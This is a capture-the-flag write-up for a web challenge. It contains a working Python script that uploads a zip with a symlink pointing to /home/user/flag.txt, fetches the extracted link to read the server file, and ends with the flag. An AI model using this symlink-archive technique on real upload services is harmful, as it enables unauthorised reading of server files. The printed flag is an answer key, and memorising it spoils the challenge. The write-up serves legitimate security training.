---
ai_date: '2025-04-27 05:14:15'
ai_summary: Solved by creating a symlink in a zip file pointing to the flag file,
  exploiting path traversal.
ai_tags:
- path
- symlink
- lfi
created: 2024-08-31T13:59
points: 50
solves: 173
updated: 2024-09-01T16:01
---

It's a simple symlink zip challenge.

We include a symlink that upon extraction will point to `/home/user/flag.txt` allowing us to read the flag easily.

## solve

```python
import re
import io
import zipfile
import requests

target = 'https://zipzone-web.challs.csc.tf'


def add_symlink_to_zip(zip_file, symlink_name, target):
    zip_info = zipfile.ZipInfo(symlink_name)
    zip_info.create_system = 3
    zip_info.external_attr = 0o120777 << 16
    zip_file.writestr(zip_info, target)


zip_buffer = io.BytesIO()

with zipfile.ZipFile(zip_buffer, 'w') as zipf:
    add_symlink_to_zip(zipf, 'flag.txt', '/home/user/flag.txt')
zip_buffer.seek(0)
r = requests.post(target, files={'file': ('file.zip', zip_buffer)})
print(requests.get(target+re.search(r'Your file is at <a href="(/files/[^"]+)">', r.text).group(1)+"/flag.txt").text)
```

```flag
CSCTF{5yml1nk5_4r3_w31rd}
```